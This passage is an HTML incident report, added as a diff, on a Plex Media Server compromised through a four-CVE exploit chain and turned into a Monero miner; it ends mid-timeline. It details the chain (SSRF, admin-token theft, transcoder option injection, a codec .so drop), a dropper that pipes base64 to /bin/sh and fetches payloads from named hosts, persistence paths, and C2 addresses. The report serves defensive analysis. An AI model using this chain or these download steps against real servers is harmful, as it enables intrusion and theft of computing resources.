@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IR-2026-1028 — Plex2Shell Cryptominer Compromise (Sanitized Public Release)</title>
+<style>
+  :root{
+    --bg:#0b0f14; --panel:#11161d; --panel2:#161d26; --line:#243040;
+    --tx:#c9d4e0; --tx-dim:#8494a7; --tx-bright:#eef4fb;
+    --red:#ff5c5c; --red-dim:#8a2f2f; --amber:#ffb347; --green:#4ade80;
+    --cyan:#38bdf8; --violet:#a78bfa; --pink:#f472b6;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  body{background:var(--bg); color:var(--tx); font-family:"Segoe UI",system-ui,-apple-system,Roboto,Arial,sans-serif; font-size:15px; line-height:1.6;}
+  .wrap{max-width:1180px; margin:0 auto; padding:0 28px 80px;}
+  .banner{background:repeating-linear-gradient(45deg,#3d0d0d,#3d0d0d 24px,#2a0808 24px,#2a0808 48px); border-bottom:2px solid var(--red); color:#ffd9d9; text-align:center; padding:8px 0; font-weight:700; letter-spacing:.18em; font-size:12px; text-transform:uppercase;}
+  header.hero{padding:46px 0 26px; border-bottom:1px solid var(--line); margin-bottom:34px;}
+  h1{font-size:31px; color:var(--tx-bright); letter-spacing:.3px; line-height:1.25;}
+  .sub{color:var(--tx-dim); margin-top:10px; font-size:15px;}
+  .badges{margin-top:16px; display:flex; gap:10px; flex-wrap:wrap;}
+  .badge{border:1px solid var(--line); border-radius:20px; padding:4px 14px; font-size:12.5px; background:var(--panel);}
+  .badge.sev{border-color:var(--red); color:var(--red); font-weight:700;}
+  .badge.ok{border-color:var(--green); color:var(--green);}
+  .badge.warn{border-color:var(--amber); color:var(--amber);}
+  h2{font-size:22px; color:var(--tx-bright); margin:52px 0 6px; padding-bottom:8px; border-bottom:1px solid var(--line);}
+  h2 .n{color:var(--cyan); font-family:Consolas,monospace; margin-right:10px;}
+  h3{font-size:17px; color:var(--tx-bright); margin:28px 0 8px;}
+  h3 .tag{font-size:11px; vertical-align:middle; margin-left:8px; padding:2px 8px; border-radius:10px; border:1px solid var(--line); color:var(--tx-dim);}
+  p{margin:10px 0;}
+  ul,ol{margin:10px 0 10px 26px;}
+  li{margin:5px 0;}
+  code{font-family:Consolas,"SF Mono",Menlo,monospace; font-size:13px; background:#0d1420; border:1px solid var(--line); border-radius:4px; padding:1px 6px; color:#9fd0ff; word-break:break-all;}
+  pre{background:#080c12; border:1px solid var(--line); border-left:3px solid var(--cyan); border-radius:8px; padding:16px 18px; overflow-x:auto; margin:14px 0; font-family:Consolas,Menlo,monospace; font-size:12.5px; line-height:1.55; color:#b8cfe6;}
+  pre .c{color:#5b6b7d;}
+  table{width:100%; border-collapse:collapse; margin:16px 0; font-size:13.5px;}
+  th{background:var(--panel2); color:var(--tx-bright); text-align:left; padding:9px 12px; border:1px solid var(--line); font-size:12.5px; text-transform:uppercase; letter-spacing:.06em;}
+  td{padding:8px 12px; border:1px solid var(--line); vertical-align:top;}
+  tr:nth-child(even) td{background:rgba(255,255,255,.015);}
+  .mono{font-family:Consolas,Menlo,monospace; font-size:12px;}
+  .cards{display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:14px; margin:22px 0;}
+  .card{background:linear-gradient(160deg,var(--panel),var(--panel2)); border:1px solid var(--line); border-radius:12px; padding:16px 18px;}
+  .card .v{font-size:26px; font-weight:700; color:var(--tx-bright); font-family:Consolas,monospace;}
+  .card .l{font-size:12px; color:var(--tx-dim); text-transform:uppercase; letter-spacing:.08em; margin-top:4px;}
+  .card.red .v{color:var(--red);} .card.amber .v{color:var(--amber);} .card.green .v{color:var(--green);} .card.cyan .v{color:var(--cyan);} .card.violet .v{color:var(--violet);}
+  .callout{border-radius:10px; padding:16px 20px; margin:18px 0; border:1px solid;}
+  .callout.crit{border-color:var(--red); background:rgba(255,92,92,.06);}
+  .callout.warn{border-color:var(--amber); background:rgba(255,179,71,.06);}
+  .callout.info{border-color:var(--cyan); background:rgba(56,189,248,.06);}
+  .callout.good{border-color:var(--green); background:rgba(74,222,128,.06);}
+  .callout .t{font-weight:700; margin-bottom:6px; text-transform:uppercase; font-size:12.5px; letter-spacing:.08em;}
+  .callout.crit .t{color:var(--red);} .callout.warn .t{color:var(--amber);} .callout.info .t{color:var(--cyan);} .callout.good .t{color:var(--green);}
+  .tl{position:relative; margin:26px 0; padding-left:26px;}
+  .tl:before{content:""; position:absolute; left:7px; top:6px; bottom:6px; width:3px; background:linear-gradient(#ff5c5c,#ffb347,#a78bfa,#38bdf8,#4ade80); border-radius:2px;}
+  .tl .ev{position:relative; margin:0 0 20px; background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:12px 18px;}
+  .tl .ev:before{content:""; position:absolute; left:-25.5px; top:18px; width:13px; height:13px; border-radius:50%; background:var(--bg); border:3px solid var(--cyan);}
+  .tl .ev.ph1:before{border-color:var(--red);} .tl .ev.ph2:before{border-color:var(--amber);} .tl .ev.ph3:before{border-color:var(--violet);} .tl .ev.ph4:before{border-color:var(--cyan);} .tl .ev.ph5:before{border-color:var(--green);}
+  .tl .tm{font-family:Consolas,monospace; color:var(--cyan); font-size:13.5px; font-weight:700;}
+  .tl .ev.ph1 .tm{color:var(--red);} .tl .ev.ph2 .tm{color:var(--amber);} .tl .ev.ph3 .tm{color:var(--violet);} .tl .ev.ph5 .tm{color:var(--green);}
+  .tl .tx{margin-top:3px;}
+  .tl .src{font-size:11.5px; color:var(--tx-dim); margin-top:4px; font-style:italic;}
+  .phase{display:inline-block; font-size:10.5px; font-weight:700; text-transform:uppercase; letter-spacing:.1em; padding:2px 10px; border-radius:10px; margin:0 4px 6px 0;}
+  .ph-label1{background:rgba(255,92,92,.15); color:var(--red); border:1px solid var(--red-dim);}
+  .ph-label2{background:rgba(255,179,71,.15); color:var(--amber); border:1px solid #6b4a1a;}
+  .ph-label3{background:rgba(167,139,250,.15); color:var(--violet); border:1px solid #463675;}
+  .ph-label4{background:rgba(56,189,248,.15); color:var(--cyan); border:1px solid #1c5a7d;}
+  .ph-label5{background:rgba(74,222,128,.15); color:var(--green); border:1px solid #235c39;}
+  .ptree{font-family:Consolas,Menlo,monospace; font-size:12.5px; background:#080c12; border:1px solid var(--line); border-radius:8px; padding:18px 20px; overflow-x:auto; line-height:1.9; white-space:pre;}
+  .ptree .mal{color:var(--red); font-weight:700;}
+  .ptree .mal2{color:var(--amber); font-weight:700;}
+  .ptree .ok{color:var(--tx-dim);}
+  .ptree .pid{color:var(--cyan);}
+  .legend{display:flex; gap:18px; flex-wrap:wrap; font-size:12px; color:var(--tx-dim); margin:10px 0;}
+  .legend i{display:inline-block; width:11px; height:11px; border-radius:3px; margin-right:6px; vertical-align:-1px;}
+  figure{margin:24px 0; background:var(--panel); border:1px solid var(--line); border-radius:12px; padding:20px;}
+  figure svg{width:100%; height:auto; display:block;}
+  figcaption{font-size:12.5px; color:var(--tx-dim); margin-top:12px; text-align:center; font-style:italic;}
+  .pill{display:inline-block; font-family:Consolas,monospace; font-size:11.5px; padding:2px 9px; border-radius:10px; border:1px solid var(--line); background:#0d1420; color:#9fd0ff;}
+  .new{background:rgba(255,92,92,.12); border-color:var(--red); color:var(--red); font-weight:700;}
+  .footer{margin-top:70px; padding-top:20px; border-top:1px solid var(--line); color:var(--tx-dim); font-size:12.5px;}
+  .toc{columns:2; column-gap:40px; font-size:13.5px;}
+  .toc a{color:var(--cyan); text-decoration:none;}
+  .toc li{margin:3px 0;}
+  @media(max-width:800px){.toc{columns:1;}}
+</style>
+</head>
+<body>
+<div class="banner">Sanitized Public Release — TLP:CLEAR — Victim Identifiers Removed, Attacker IOCs Retained</div>
+<div class="wrap">
+
+<header class="hero">
+  <h1>Cryptomining Compromise of a <span style="color:var(--cyan)">Home Media Server</span> via the Plex2Shell Exploit Chain</h1>
+  <div class="sub">Independent re-analysis and deconstruction of the 2026-10-27 → 2026-10-28 intrusion: binary inspection, timeline reconstruction, network attribution, and post-hoc verification of the original response.<br><strong style="color:var(--amber)">Sanitized for public release:</strong> the victim hostname, internal IP addressing, the operator’s remote-client public IP, storage volume fingerprints, and container names have been removed or replaced with documentation placeholders. All attacker-side indicators (C2 endpoints, pools, wallet, file hashes) are deliberately retained for defensive value.</div>
+  <div class="badges">
+    <span class="badge sev">SEVERITY: HIGH</span>
+    <span class="badge">IR-2026-1028</span>
+    <span class="badge">Host: home media server (sanitized)</span>
+    <span class="badge">Vector: Plex2Shell (CVE-2026-96652 / -54 / -55 / -56)</span>
+    <span class="badge">Impact: resource theft + credential exposure</span>
+    <span class="badge ok">STATUS: CONTAINED</span>
+    <span class="badge warn">ACTIONS OUTSTANDING</span>
+  </div>
+</header>
+
+<nav>
+<h2><span class="n">§</span>Contents</h2>
+<ul class="toc">
+  <li><a href="#s1">1. Executive summary</a></li>
+  <li><a href="#s2">2. System profile</a></li>
+  <li><a href="#s3">3. Detection narrative</a></li>
+  <li><a href="#s4">4. Entry vector — the Plex2Shell chain</a></li>
+  <li><a href="#s5">5. Master timeline</a></li>
+  <li><a href="#s6">6. Malware components (binary analysis)</a></li>
+  <li><a href="#s7">7. Persistence mechanisms</a></li>
+  <li><a href="#s8">8. Process tree at detection</a></li>
+  <li><a href="#s9">9. Network connections &amp; C2 map</a></li>
+  <li><a href="#s10">10. Evasion &amp; adversary capabilities</a></li>
+  <li><a href="#s11">11. Evidence of a second actor</a></li>
+  <li><a href="#s12">12. Impact assessment</a></li>
+  <li><a href="#s13">13. Response, containment &amp; response errors</a></li>
+  <li><a href="#s14">14. Residual risk &amp; recommendations</a></li>
+  <li><a href="#s15">15. Investigation limitations</a></li>
+  <li><a href="#a1">Appendix A — Indicators of compromise</a></li>
+  <li><a href="#a2">Appendix B — Evidence manifest</a></li>
+  <li><a href="#a3">Appendix C — Malware code &amp; configuration artifacts</a></li>
+</ul>
+</nav>
+
+<!-- ============ 1. EXEC SUMMARY ============ -->
+<h2 id="s1"><span class="n">1</span>Executive summary</h2>
+
+<p>At <strong>21:50:05 CDT on 2026-10-27</strong>, an unauthenticated remote attacker weaponized the
+<strong>Plex2Shell</strong> vulnerability chain (CVE-2026-96652, CVE-2026-96654, CVE-2026-96655, CVE-2026-96656 —
+added to the CISA KEV catalog six days earlier, on 2026-10-21) against an internet-exposed
+Plex Media Server <code>1.42.2.10156-f737b826c</code> on host <code>media-server</code>. The chain abuses an SSRF in
+<code>/player/timeline</code> to exfiltrate the server owner's admin token, then injects attacker options into the
+x264 transcoder to write a malicious shared object into Plex's Codecs directory — which Plex loads
+unverified at startup. The result: <strong>unauthenticated remote code execution as the <code>plex</code> service
+account (uid 997)</strong>, without touching a single package file (<code>dpkg -V plexmediaserver</code> remained clean).</p>
+
+<p>The payload was a Monero (RandomX) mining operation of unusual sophistication for a "mere miner":
+a constructor-driven dropper staged a <strong>UPX-packed, polymorphic, self-healing loader</strong> ("boatnet")
+disguised as kernel threads (<code>[kthreadd]</code>), which installed <strong>six independent persistence mechanisms</strong>,
+rewrote the <code>plex</code> crontab every 60 seconds, evaded cgroup-based service stops, <strong>defended the host
+against a rival mining crew</strong>, and finally downloaded and supervised a rebranded XMRig miner
+(<code>ksoftirqd/0</code>) mining to MoneroOcean pools at ~<strong>1,200 H/s across 8 threads</strong>.</p>
+
+<p>The intrusion ran undetected for <strong>13 hours 45 minutes</strong>. It was discovered <em>incidentally</em> —
+while the operator troubleshot an unrelated display fault, a process-table check revealed a
+<code>ksoftirqd/0</code>-named process owned by <code>plex</code> burning <strong>398% CPU</strong>. No monitoring alert had fired
+despite a load average of ~5 sustained for hours.</p>
+
+<p><strong>It could have been much worse — and the guardrails were partly luck, not design.</strong> The miner kept the
+media server alive (it whitelisted Plex processes to preserve its own re-entry path), no root escalation
+was observed, and no data exfiltration was identified. But the attacker <em>did</em> hold the Plex owner's
+admin token and every service credential readable by uid 997 for nearly 14 hours, and the persistence
+was engineered to survive reboots, process kills, and even a Plex package upgrade.</p>
+
+<div class="cards">
+  <div class="card red"><div class="v">13h 45m</div><div class="l">Dwell time (21:50 → 11:35)</div></div>
+  <div class="card red"><div class="v">~1,200 H/s</div><div class="l">RandomX hashrate, 8 threads</div></div>
+  <div class="card amber"><div class="v">398%</div><div class="l">CPU of masqueraded miner at detection</div></div>
+  <div class="card amber"><div class="v">6</div><div class="l">Independent persistence mechanisms</div></div>
+  <div class="card violet"><div class="v">304</div><div class="l">Cron executions of the loader (syslog)</div></div>
+  <div class="card violet"><div class="v">116</div><div class="l">Polymorphic copies on disk (round 3)</div></div>
+  <div class="card cyan"><div class="v">6</div><div class="l">Distinct loader SHA-256 variants</div></div>
+  <div class="card green"><div class="v">5.38 → 0.39</div><div class="l">Load average, before → after containment</div></div>
+</div>
+
+<div class="callout crit">
+  <div class="t">Highest-priority residual risk — not fixed by malware removal</div>
+  <p style="margin:4px 0">The exploit chain operates by <strong>stealing the Plex server owner's admin authentication token</strong>
+  (<code>PlexOnlineToken</code>, readable in <code>Preferences.xml</code> for the entire dwell). Removing the malware does not
+  invalidate it. Account credential rotation, global sign-out and 2FA on plex.tv are still outstanding (§14).</p>
+</div>
+
+<div class="callout info">
+  <div class="t">New findings from this re-analysis (not in the original report)</div>
+  <ul style="margin:6px 0 2px">
+    <li><strong>Three additional live C2 endpoints</strong> observed in the captured socket table: <code>85.137.54.178:18082</code>, <code>91.92.40.202:43365</code>, and <code>72.14.179.64:443</code> (§9).</li>
+    <li><strong>Smoking-gun exploit provenance:</strong> the first loader's environment contains <code>PWD=/tmp/plex-transcoder/Transcode/Sessions/plex-transcode-&lt;session-id-redacted&gt;</code> — direct proof execution originated inside the Plex transcode session path (§4.2, §6.2).</li>
+    <li><strong>Miner positively identified</strong> as a rebrand of XMRig 6.26.0 (MoneroOcean algo-switching fork) calling itself <code>kswap 6.26.0</code> (§6.4).</li>
+    <li><strong>File birth-times (crtime)</strong> pin the miner's first run to 22:23:30 on 2026-10-27 and reveal the loader killed/re-spawned its own miner at 11:04:17 (§5, §6.4).</li>
+    <li><strong>Stage-1 .so anatomy:</strong> 155 bytes of code, zero real imports, and ~1.02 MB of trailing slack — size-camouflaged to sit among legitimate ~1 MB Plex codec libraries (§6.1).</li>
+  </ul>
+</div>
+
+<!-- ============ 2. SYSTEM PROFILE ============ -->
+<h2 id="s2"><span class="n">2</span>System profile</h2>
+<table>
+<tr><th style="width:220px">Component</th><th>Value</th></tr>
+<tr><td>Host / role</td><td><code>media-server</code> (192.168.x.x) — headless Ubuntu media &amp; *arr server</td></tr>
+<tr><td>OS / kernel</td><td>Ubuntu 24.04, Linux <code>6.17.0-35-generic</code> x86-64</td></tr>
+<tr><td>Uptime at detection</td><td>61 days (booted 2026-08-27 16:44:06)</td></tr>
+<tr><td>CPU</td><td>AMD Ryzen 3 5300U — 4 cores / 8 threads (mining target)</td></tr>
+<tr><td>Storage</td><td>/ (ext4, 234 GB); /storage (XFS, multi-TB on md0 RAID10 <code>[UUUU]</code>)</td></tr>
+<tr><td>Compromised account</td><td><code>plex</code>, uid 997, home <code>/var/lib/plexmediaserver</code>, shell <code>/usr/sbin/nologin</code></td></tr>
+<tr><td>Shared-uid services</td><td><code>prowlarr</code>, <code>radarr</code>, <code>sonarr</code>, <code>sabnzbd</code> (systemd units) + two application Docker containers — all uid 997</td></tr>
+<tr><td>Firewall</td><td><code>ufw</code> active; <strong>32400/tcp ALLOW from Anywhere (v4+v6)</strong></td></tr>
+<tr><td>Plex exposure</td><td><code>PublishServerOnPlexOnlineKey=1</code>, <code>ManualPortMappingMode=1</code>, <code>ManualPortMappingPort=55555</code> (forwarded to 32400)</td></tr>
+<tr><td>Plex version</td><td>At compromise: <code>1.42.2.10156-f737b826c</code> (<strong>vulnerable</strong>) → patched to <code>1.43.5.11079-b3b13e506</code> during response</td></tr>
+</table>
+
+<div class="callout warn">
+  <div class="t">Analytical caution — shared uid 997</div>
+  <p style="margin:4px 0">Because six unrelated services run as uid 997, <em>"owned by plex" is not an indicator of compromise</em> on this host.
+  Attribution throughout this report relies on <code>/proc/PID/exe</code> symlink targets, cgroup membership, and file birth times — not ownership alone.
+  The shared uid also widened the blast radius of the response itself (§13.3).</p>
+</div>
+
+<!-- ============ 3. DETECTION ============ -->
+<h2 id="s3"><span class="n">3</span>Detection narrative — found by accident</h2>
+<p>The compromise was not detected by any control. The sequence:</p>
+<ol>
+  <li>The operator reported the physical console would not wake on a DisplayPort monitor and asked whether the system ran headless. It does (<code>multi-user.target</code>, no X/Wayland).</li>
+  <li>Display diagnosis found an <strong>unrelated genuine fault</strong>: the machine booted with no monitor attached (<code>amdgpu: Cannot find any crtc or sizes</code>), and when a monitor was attached at 11:00:56 on 2026-10-28 the kernel logged <code>fbcon: Deferring console take-over</code> — with deferred-takeover enabled and Plymouth never handing off, tty1 wrote to a dummy console driver. Fix staged (<code>fbcon=nodefer</code> in <code>/etc/default/grub</code>) but not yet applied.</li>
+  <li>While checking whether a reboot was safe, <code>ps</code> showed a process consuming <strong>398% CPU</strong>, owned by <code>plex</code>, with <code>comm = ksoftirqd/0</code>.</li>
+  <li>Real kernel threads are root-owned children of PID 2. This one had <code>exe → /tmp/.cache/ksoftirqd</code> and uid 997. <strong>That single discrepancy exposed the intrusion.</strong></li>
+</ol>
+<div class="callout warn">
+  <div class="t">Detection gap</div>
+  <p style="margin:4px 0">Sustained ~400% CPU and load ~5 persisted for hours with zero alerting — no anomaly detection on CPU,
+  no alert on non-root processes bearing kernel-thread names, no alert on executable writes to <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code>,
+  and no alert on a previously-empty user acquiring a crontab.</p>
+</div>
+<!-- ============ 4. ENTRY VECTOR ============ -->
+<h2 id="s4"><span class="n">4</span>Entry vector — the Plex2Shell chain</h2>
+<p>Plex2Shell chains four flaws in Plex Media Server before build <strong>1.43.3.10861</strong> into unauthenticated RCE
+as the server account. CISA added all four CVEs to the Known Exploited Vulnerabilities catalog on <strong>2026-10-21</strong>,
+following in-the-wild exploitation delivering cryptominers and proxy malware. This host was compromised
+<strong>six days later</strong> — a textbook KEV-lag window.</p>
+
+<figure>
+<svg viewBox="0 0 1120 460" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI,Arial,sans-serif">
+  <defs>
+    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#38bdf8"/>
+    </marker>
+    <marker id="ar2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#ff5c5c"/>
+    </marker>
+  </defs>
+  <g>
+    <rect x="14" y="24" width="200" height="78" rx="10" fill="#161d26" stroke="#38bdf8"/>
+    <text x="114" y="54" fill="#eef4fb" font-size="14" font-weight="700" text-anchor="middle">Internet</text>
+    <text x="114" y="74" fill="#8494a7" font-size="11" text-anchor="middle">unauthenticated attacker</text>
+    <text x="114" y="90" fill="#8494a7" font-size="11" text-anchor="middle">scans :32400 / :55555</text>
+    <rect x="258" y="24" width="230" height="78" rx="10" fill="#161d26" stroke="#38bdf8"/>
+    <text x="373" y="50" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">ufw ALLOW 32400/tcp</text>
+    <text x="373" y="68" fill="#8494a7" font-size="11" text-anchor="middle">manual port map 55555 → 32400</text>
+    <text x="373" y="84" fill="#8494a7" font-size="11" text-anchor="middle">Plex 1.42.2 (vulnerable)</text>
+    <rect x="532" y="24" width="260" height="78" rx="10" fill="#161d26" stroke="#ffb347"/>
+    <text x="662" y="50" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">① SSRF — CVE-2026-96652</text>
+    <text x="662" y="68" fill="#8494a7" font-size="11" text-anchor="middle">GET /player/timeline?searchOne=…</text>
+    <text x="662" y="84" fill="#8494a7" font-size="11" text-anchor="middle">server issues request on attacker's behalf</text>
+    <rect x="836" y="24" width="270" height="78" rx="10" fill="#161d26" stroke="#ffb347"/>
+    <text x="971" y="50" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">② Token theft — CVE-2026-96654</text>
+    <text x="971" y="68" fill="#8494a7" font-size="11" text-anchor="middle">loopback request carries the</text>
+    <text x="971" y="84" fill="#ff9d9d" font-size="11" text-anchor="middle">owner's ADMIN TOKEN → attacker</text>
+    <line x1="214" y1="63" x2="252" y2="63" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar)"/>
+    <line x1="488" y1="63" x2="526" y2="63" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar)"/>
+    <line x1="792" y1="63" x2="830" y2="63" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar)"/>
+  </g>
+  <path d="M 971 102 L 971 132 L 662 132 L 662 160" fill="none" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar)"/>
+  <g>
+    <rect x="532" y="164" width="260" height="78" rx="10" fill="#161d26" stroke="#ffb347"/>
+    <text x="662" y="190" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">③ Preference injection</text>
+    <text x="662" y="208" fill="#8494a7" font-size="11" text-anchor="middle">set TranscoderH264Options (admin)</text>
+    <text x="662" y="224" fill="#8494a7" font-size="11" text-anchor="middle">appended verbatim to x264 opts</text>
+    <rect x="836" y="164" width="270" height="78" rx="10" fill="#161d26" stroke="#ff5c5c"/>
+    <text x="971" y="190" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">④ Codecs .so drop — CVE-2026-96656</text>
+    <text x="971" y="208" fill="#8494a7" font-size="11" text-anchor="middle">transcode of crafted video writes</text>
+    <text x="971" y="224" fill="#ff9d9d" font-size="11" text-anchor="middle">zz55802.so into Codecs dir</text>
+    <line x1="792" y1="203" x2="830" y2="203" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar)"/>
+  </g>
+  <path d="M 532 203 L 502 203 L 502 260 L 114 260 L 114 288" fill="none" stroke="#38bdf8" stroke-width="2" marker-end="url(#ar)"/>
+  <g>
+    <rect x="14" y="292" width="240" height="86" rx="10" fill="#1d1420" stroke="#ff5c5c" stroke-width="1.5"/>
+    <text x="134" y="318" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">⑤ dlopen at startup</text>
+    <text x="134" y="336" fill="#8494a7" font-size="11" text-anchor="middle">Plex loads every .so in Codecs —</text>
+    <text x="134" y="352" fill="#8494a7" font-size="11" text-anchor="middle">no signature / symbol checks</text>
+    <text x="134" y="368" fill="#ff9d9d" font-size="11" text-anchor="middle">.init_array fires ⇒ RCE as plex</text>
+    <rect x="308" y="292" width="240" height="86" rx="10" fill="#1d1420" stroke="#ff5c5c"/>
+    <text x="428" y="318" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">⑥ Stage-1 dropper</text>
+    <text x="428" y="336" fill="#8494a7" font-size="11" text-anchor="middle">base64 blob → /bin/sh</text>
+    <text x="428" y="352" fill="#8494a7" font-size="11" text-anchor="middle">HOME=/tmp; fetch /dev/shm/.x</text>
+    <text x="428" y="368" fill="#8494a7" font-size="11" text-anchor="middle">from 176.123.7.7/bins/1</text>
+    <rect x="602" y="292" width="240" height="86" rx="10" fill="#1d1420" stroke="#ff5c5c"/>
+    <text x="722" y="318" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">⑦ Loader "boatnet"</text>
+    <text x="722" y="336" fill="#8494a7" font-size="11" text-anchor="middle">polymorphic, UPX-packed</text>
+    <text x="722" y="352" fill="#8494a7" font-size="11" text-anchor="middle">masquerades as [kthreadd]</text>
+    <text x="722" y="368" fill="#8494a7" font-size="11" text-anchor="middle">installs cron + watchdogs</text>
+    <rect x="896" y="292" width="210" height="86" rx="10" fill="#1d1420" stroke="#ff5c5c"/>
+    <text x="1001" y="318" fill="#eef4fb" font-size="13" font-weight="700" text-anchor="middle">⑧ XMRig miner</text>
+    <text x="1001" y="336" fill="#8494a7" font-size="11" text-anchor="middle">"ksoftirqd/0"</text>
+    <text x="1001" y="352" fill="#8494a7" font-size="11" text-anchor="middle">RandomX → MoneroOcean</text>
+    <text x="1001" y="368" fill="#8494a7" font-size="11" text-anchor="middle">~1,200 H/s × 13 h</text>
+    <line x1="254" y1="335" x2="302" y2="335" stroke="#ff5c5c" stroke-width="2" marker-end="url(#ar2)"/>
+    <line x1="548" y1="335" x2="596" y2="335" stroke="#ff5c5c" stroke-width="2" marker-end="url(#ar2)"/>
+    <line x1="842" y1="335" x2="890" y2="335" stroke="#ff5c5c" stroke-width="2" marker-end="url(#ar2)"/>
+  </g>
+  <rect x="14" y="410" width="1092" height="34" rx="8" fill="rgba(56,189,248,.06)" stroke="#1c5a7d"/>
+  <text x="560" y="432" fill="#8494a7" font-size="11.5" text-anchor="middle">Entire chain executes as uid 997 (plex). The plexmediaserver package itself is never modified — the backdoor lives entirely in operator-writable state under /var/lib (dpkg -V clean).</text>
+</svg>
+<figcaption>Fig. 1 — Plex2Shell attack chain as executed against media-server, 2026-10-27 21:50 CDT.</figcaption>
+</figure>
+
+<h3>4.1 Corroborating local evidence</h3>
+<ul>
+  <li>The dropped <code>zz55802.so</code> sat in the Codecs directory timestamped <strong>2026-10-27 21:50:05</strong>, among 14 legitimate codec libraries all dated 2026-07-15 and all matching <code>lib*_{decoder,encoder}.so</code>.</li>
+  <li>All malicious execution was uid 997, never root — matching "code execution as the account running the server."</li>
+  <li>Malicious processes held <strong>inherited file descriptors to Plex's own client sockets</strong> (fd 88 → an established Plex client session on :32400; fd 91 likewise), proving they were spawned from within the Plex process tree rather than via a separate service.</li>
+  <li><code>dpkg -V plexmediaserver</code>: no deviations.</li>
+</ul>
+
+<h3>4.2 Smoking gun — exploit provenance in the loader's environment <span class="tag new">NEW FINDING</span></h3>
+<p>The environment block recovered from the first loader instance (pid 1327450, started 21:50:15) preserves its
+original working directory and argv0:</p>
+<pre>=/dev/shm/.x
+HOME=/tmp
+PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+PWD=/tmp/plex-transcoder/Transcode/Sessions/plex-transcode-&lt;session-id-redacted&gt;
+BOAT_LOCK_FD=200</pre>
+<p><code>PWD</code> inside a live <strong>Plex transcode session directory</strong> is direct, process-level proof that the first
+execution originated from the transcode/exploit path — corroborating the CVE-2026-96656 mechanics independently of
+file timestamps. <code>BOAT_LOCK_FD=200</code> shows the loader reserves a high fd for its lock, and <code>HOME=/tmp</code>
+(from the stage-1 payload) is what later makes the shell-rc persistence in <code>/tmp</code> functional (§7.3).</p>
+
+<!-- ============ 5. TIMELINE ============ -->
+<h2 id="s5"><span class="n">5</span>Master timeline (CDT)</h2>
+<p>Timestamps are from process start times (<code>ps lstart</code>, authoritative), file <em>birth</em> times (<code>stat</code> crtime,
+recovered during collection), the malware's own logs, and syslog. Phases:
+<span class="phase ph-label1">initial access</span><span class="phase ph-label2">staging</span><span class="phase ph-label3">steady-state mining</span><span class="phase ph-label4">detection &amp; response</span><span class="phase ph-label5">remediation</span></p>
+
+<div class="tl">
+  <div class="ev">
+    <div class="tm">Aug 27, 16:44:06</div>
+    <div class="tx">System boots headless — <code>amdgpu: Cannot find any crtc or sizes</code>; no framebuffer created (origin of the unrelated console fault, §3). Plex remains un-patched at 1.42.2 through this incident.</div>
+    <div class="src">journalctl -k</div>
+  </div>
+  <div class="ev">
+    <div class="tm">Oct 21</div>
+    <div class="tx">CISA adds the four Plex2Shell CVEs to the KEV catalog after observed in-the-wild exploitation. Host remains exposed: <code>32400/tcp ALLOW Anywhere</code> + port-map 55555.</div>
+    <div class="src">public advisory</div>
+  </div>
+  <div class="ev ph1">
+    <div class="tm">Oct 27, 21:50:05</div>
+    <div class="tx"><strong>INITIAL COMPROMISE.</strong> Exploit transcode writes <code>zz55802.so</code> (1,036,800 B) into the Plex Codecs directory. Plex loads it; the <code>.init_array</code> constructor fires and pipes a base64-embedded shell payload through <code>base64 -d</code> to <code>/bin/sh</code>.</div>
+    <div class="src">file mtime/crtime; strings in zz55802.so</div>
+  </div>
+  <div class="ev ph1">
+    <div class="tm">Oct 27, 21:50:15</div>
+    <div class="tx">First loader generation running: watchdog <code>sh /tmp/.cache/.cpuhp690.loop</code> (pid 1327437) and bot pid 1327450 + 2 threads, masquerading as <code>[kthreadd]</code>, argv0 <code>/dev/shm/.x</code>, PWD inside the transcode session dir.</div>
+    <div class="src">ps lstart; /proc/1327450/environ</div>
+  </div>
+  <div class="ev ph1">
+    <div class="tm">Oct 27, 21:50:16</div>
+    <div class="tx">Loader installs persistence: crontab LIST + REPLACE logged; <code>/tmp/.cache</code> directory born; identical boat-rc files written to <code>/tmp/.bashrc</code>, <code>/tmp/.profile</code>, <code>/tmp/.bash_profile</code>; bot copies staged to <code>/dev/shm</code>, <code>/var/tmp</code>, <code>/tmp</code> as <code>.b1327455</code> (fresh polymorphic variant, SHA-256 <code>a0c56849…</code>).</div>
+    <div class="src">journalctl (crontab[1327433/47]); stat crtime; round-2 artifacts</div>
+  </div>
+  <div class="ev ph1">
+    <div class="tm">Oct 27, 21:51:01</div>
+    <div class="tx"><strong>First cron execution</strong> of <code>/tmp/.cache/.cpuhp690</code> — 56 seconds after the exploit landed. Cron fires it 304 times before containment.</div>
+    <div class="src">syslog CRON[1327717]</div>
+  </div>
+  <div class="ev ph2">
+    <div class="tm">Oct 27, 21:54 → 22:06</div>
+    <div class="tx">Stage-1 dropper hammers the <strong>secondary</strong> host 80.87.206.86 (port 80) for the <code>/A</code> payload — wget, curl, python3 all time out; <code>python: not found</code>. Five download-tool fallback chains visible in the Plex unit journal.</div>
+    <div class="src">journal-plex.txt (pids 1328771…1333194)</div>
+  </div>
+  <div class="ev ph2">
